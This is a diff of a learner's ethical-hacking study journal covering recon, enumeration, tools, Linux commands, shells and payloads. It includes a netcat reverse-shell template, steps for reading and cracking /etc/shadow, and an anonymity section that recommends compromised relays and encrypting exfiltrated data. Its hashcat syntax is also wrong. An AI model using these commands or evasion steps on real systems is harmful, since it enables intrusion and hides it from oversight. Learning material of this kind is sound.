@@ -1,49 +1,295 @@
-# Ethical-Hacking-Journal
+# Ethical Hacking Journal
 
-This is a journal to keep track of overall progress and new topics I learn about Ethical Hacking / Hacking in general
+This is a journal to keep track of overall progress and new topics I learn about Ethical Hacking / Hacking in general.
 
-here are some key concepts im aware of, but might need to brush up on: 
-# Reconnaissance
+---
+
+## 🧠 Key Concepts I’m Aware Of (But Might Need to Brush Up On)
+
+---
+
+### Reconnaissance
+
 I'm aware that there are two different types: active and passive.
 
-Active is when you are actively interacting with the target, less hidden, more risk of being found out and making "noise".
+#### 🟠 Active Recon
+- Actively interacting with the target
+- Less hidden, more risk of being found out and making "noise"
 
-Passive recon: not directly interacting with the target. this is done by looking at any social media post, gaining info that way. looking to see if any info has been uploaded to the internet about this company, looking at layouts of the building for security if doing an internal pentest etc. 
+#### 🟢 Passive Recon
 
-# Enumeration
+**Physical / Social Recon** (not directly interacting with the target):
+- Social media posts
+- Uploaded company info
+- Satellite images, drone recon, building layouts
+- Badge readers, break areas, fencing, security patrols
+- Employee names, job titles, phone numbers, managers
+- Pictures of badges, desk setups, computers
 
-Enumeration is the act of then going further, starting to dig deeper, identifing active host, open ports, any available services on the network/system. basically trying to identify a point of entry, or multiple points of entry. Enumeration is a great way to find out service versions that might be outdated and have vulns that can be exploited, shared resources, and config data. 
+**Web / Host Recon**:
+- Target validation: `WHOIS`, `nslookup`, `dnsrecon`
+- Subdomain discovery: Google Fu, `dig`, `Nmap`, `Sublist3r`, `Bluto`, `crt.sh`
+- Fingerprinting: `Nmap`, Wappalyzer, WhatWeb, BuiltWith, `netcat`
+- Data breaches: HaveIBeenPwned, etc.
 
-# Exploitation
+> Again, check satellite images for physical testing. This will give you a great overview of the building.
 
-This is when the fun happens. During this stage of the hacking methodology, you try to exploit any identified vulns to gain some form of access or control of a system. this can be a workers computer, maybe a network etc. 
+**Google Hacking Tips**:
+- `site:domain.com` – gather info about the site
+- `-www` – helps find subdomains
+- `filetype:` – search for specific file types exposed
 
-# Post-Exploitation 
+---
 
-After Exploitation, this is when you would try to maintain access aka gaining "Persistance". You could even try to escalate your own privs by trying to reach a position of more power/control like admin, or any other position that has more privileges. This is also the chance to gather more info if needed, but also it's a good things to do so in general. 
+### Enumeration
 
+Enumeration is the act of digging deeper to:
+- Identify active hosts
+- Discover open ports
+- Check available services on the network/system
 
-# Tools
+Helps identify:
+- Exploitable services
+- Outdated versions
+- Shared resources
+- Config leaks
 
-some great tools to use during the process include, Nmap for port scanning, this is a great way to discover open ports and services. Enum4Linux to gather info for window machines. Nessus and OpenVAS are used for vuln scanning. Nikto scans for any security issues. 
+> Hacking is mostly just enumeration.
 
-The Metasploit Framework itself is a pretty handy tool that provides a myriad of payloads and exploits for various systems, with Meterpreter being an advanced payload for post-exploitation, burp suite is also great for web application testing, used to find exploits like sql-injection and XSS. John the Ripper and Hashcat are great for password cracking.
+---
 
-Here are some more tools that are used in corporate env: 
-Nmap, Nessus, Burp Suite Pro, Cobalt Strike, BloodHound, Responder, Impacket, CrackMapExec.
-ALWAYS use a VM workspace like Kali linux, or Parrot OS, it does not matter as long as it is not your own OS. 
+### Exploitation
 
-# Reporting
+This is when the fun happens:
+- Try to exploit identified vulnerabilities to gain access or control of a system (e.g., employee computer or company network)
 
-This is the most important part of the entire methodology in my opinion, mostly because it consist of all your findings, and how you found them, what you did, how to fix etc. every single detail is important and MUST be filed with ut-most detail. 
+---
 
+### Post-Exploitation
 
+After exploitation, you:
+- Maintain access ("Persistence")
+- Try to escalate privileges (e.g., become admin)
+- Gather more internal info
 
-# Enviroment
+---
 
-I just installed kali linux, going to mess around with the OS for a bit, I am use to linux OS so I don't think im gonna have to much trouble. 
+## 🧰 Tools
 
-The next thing im gonna do is install burp, netscan, hashmap etc; any tools that haven't been installed yet. 
+Some great tools to use during the process include:
 
-Also, I'm not entirely new to cyber/hacking I started about a year ago but kinda have been on and off and this time around, I really wanna take it seriously so that's why I made this journal. 
+- **Nmap**: Port scanning – find open ports and service types
+- **Enum4Linux**: Gather info on Windows machines
+- **Nessus / OpenVAS**: Vulnerability scanners
+- **Nikto**: Scan for web server security issues
+- **Metasploit Framework**: Exploitation and payload delivery
+  - **Meterpreter**: Advanced post-exploitation payload
+- **Burp Suite**: Web application testing
+- **John the Ripper / Hashcat**: Password cracking
 
+**Corporate Tools**:
+- Nmap, Nessus, Burp Suite Pro, Cobalt Strike, BloodHound, Responder, Impacket, CrackMapExec
+
+> **Use a VM workspace** like Kali Linux or Parrot OS. Never use your main operating system.
+
+**More Info**:
+
+- **Nmap**: Open ports and server information
+- **Nessus**: Vulnerability scanning
+- **Hydra**: Brute-force password cracker
+- **Wireshark**: Network protocol analyzer
+- **Burp Suite**: Proxy to intercept and analyze HTTP traffic
+- **Responder**: Poison network protocols and capture authentication credentials
+- **Hashcat**: Cracking hashes  
+  - Syntax: `hashcat -m <hashfile> <path/to/passlist>`
+
+---
+
+## 📝 Reporting
+
+This is the **most important part** of the methodology:
+- Document all findings
+- Explain how you found them
+- Provide steps to reproduce and remediate
+- Include every single detail with precision
+
+---
+
+## 💻 Environment
+
+- Installed Kali Linux, familiar with Linux OS
+- Installing tools: Burp Suite, NetScan, Hashcat, etc.
+- Started learning about 1 year ago (on and off)
+- Taking it seriously this time – hence the journal
+
+---
+
+## 🕶️ Staying Anonymous / Invisible
+
+- Create burner accounts (no real-world ties)
+- Avoid accessing illegal content without strong protection
+- Use end-to-end encryption (Signal, Matrix)
+- Avoid personally styled writing
+
+**Tools & Methods**:
+- VPN chains (different countries)
+- Tor or I2P
+- Compromised relays (pivot points)
+- Burner SIMs & devices
+- Tails OS / Whonix / Qubes OS
+- Air-gapped systems (no internet)
+- VMs for compartmentalization
+- Wipe/reflash devices regularly
+
+**Best Practices**:
+- Never reuse usernames, passwords, handles
+- Use temp email and crypto wallets
+- Encrypt everything (disks, messages, exfiltrated data)
+- Avoid behavior that draws attention (taunting, bragging online)
+
+---
+
+## 🧮 Linux Commands
+
+```bash
+ls        # list all content in a dir
+cd        # switches dir
+ls -la    # list hidden files
+echo      # output content
+mv        # moves a file
+cp        # copies files
+locate    # finds files you name
+grep      # pulls out the line
+cut       # cuts a line (-d specifies delimiter)
+
+# Permissions
+chmod +x         # add execute permission
+chmod 777        # read, write, execute for all
+
+# User Management
+adduser          # adds user
+cat /etc/passwd  # view users and UIDs
+cat /etc/shadow  # view password hashes
+su               # switch user
+
+Permissions Format (ls -la):
+
+    File/folder owner
+
+    Group owner
+
+    Others
+
+    rw: read/write
+
+    rwx: read/write/execute
+
+    - = file, d = directory
+
+🌐 Network Commands
+
+ifconfig       # view network info
+iwconfig       # for wireless hacking
+ping           # test connectivity
+arp -a         # list IP and MAC address pairs
+netstat -ano   # show open ports and connections
+route          # display routing info
+
+⚙️ Installing Tools & Starting Services
+
+apt-get install <tool>               # install tools
+service apache2 start               # start Apache web server
+service postgresql start            # start PostgreSQL
+systemctl enable ssh                # enable SSH
+systemctl enable postgresql         # start PostgreSQL at boot
+python3 -m http.server 80           # start Python web server
+
+📡 Protocols
+
+    TCP: Connection-oriented, reliable (used in apps needing guaranteed delivery)
+
+    UDP: Connectionless, faster, but less reliable (used in video/audio streaming)
+
+Stealth Scan (TCP 3-way Handshake):
+
+    SYN → SYN-ACK → RST (avoids full connection)
+
+📋 Methodology
+
+    Start with a network scan using nmap to find open ports
+
+    Test open ports:
+
+        Visit web ports (443, 80)
+
+        Analyze for info leaks (e.g., server version, Apache/Redhat)
+
+    View source code for comments and leaks
+
+    Use nikto for server enumeration
+
+    Use dirbuster to brute-force subdirectories
+
+    Look for headers exposing server info (info disclosure)
+
+Post-Exploitation Enumeration
+
+    Use arp -a, netstat, route
+
+    Use sudo -l to check privilege levels
+
+    Access /etc/shadow and /etc/passwd
+
+    Use unshadow to combine files and crack with john or hashcat
+
+🐚 Shells
+Reverse Shell
+
+# On your machine:
+nc -lvp <PORT>
+
+# On target:
+nc <YOUR_IP> <PORT> -e /bin/bash
+
+Bind Shell
+
+    Target opens a port
+
+    You connect to it directly
+
+    You can establish a shell by exploiting a vulnerability, sending a payload via Metasploit, and connecting back to the listener.
+
+💣 Payloads
+Non-Staged Payloads
+
+    Entire shellcode sent at once
+
+    Larger and more reliable
+
+    Example: windows/meterpreter_reverse_tcp
+
+Staged Payloads
+
+    Sent in parts/stages
+
+    Smaller footprint but less stable
+
+    Example: windows/meterpreter/reverse_tcp
+
+🔐 Credential Stuffing
+
+    Using known cleartext passwords against login forms
+
+    Simple but often effective
+
+🪪 Token Impersonation
+
+    Move through systems without revealing your own credentials
+
+    Use the token of a verified user/admin
+
+    Often done via Meterpreter shell
+
+🧪 LLMNR Poisoning
+
+    (To be expanded – placeholder for techniques using Responder or similar tools)
